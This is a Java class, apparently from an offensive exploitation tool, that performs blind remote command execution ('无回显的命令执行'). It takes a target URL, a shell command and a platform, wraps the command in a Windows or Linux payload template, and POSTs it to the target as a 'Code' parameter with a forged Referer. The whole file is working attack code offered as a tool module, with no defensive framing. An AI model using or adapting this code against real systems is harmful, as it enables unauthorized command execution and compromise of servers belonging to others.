package com.droplab.Controller.elShell.Service;

import com.droplab.Controller.elShell.Common.PayloadFactory;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.Utils.ResponseUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.util.HashMap;
import java.util.Iterator;

/**
 * 无回显的命令执行
 */
public class NoResponseExec extends BugService {
    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String url = "";
                String cmd =null;
                String platform="windows";
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("url")) {
                        url = params.get(key);
                    } else if (key.equals("cmd")) {
                        cmd = params.get(key);
                    } else if (key.equals("platform")) {
                        platform = params.get(key);
                    }
                }
                if(!url.equals("") && !url.isEmpty()){
                    String code=null;
                    cmd=cmd.trim();
                    if(platform.equals("windows")){
                        code = String.format(PayloadFactory.instance().getCmdExecuteWin(), cmd);
                    }else {
                        code= String.format(PayloadFactory.instance().getCmdExecuteLinux(), cmd);
                    }
                    HashMap<String, String> headers = new HashMap<>();
                    CommonUtils.hashMapClone(InfoUtils.headers, headers);
                    headers.put("Referer", url);
                    HashMap paramMap = new HashMap();
                    paramMap.put("Code", code);
                    Connection.Response post = HttpUtils.post(headers,url,paramMap );
                    ResponseUtils responseUtils = new ResponseUtils();
                    responseUtils.setMessage("命令执行结束!");
                    return responseUtils;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
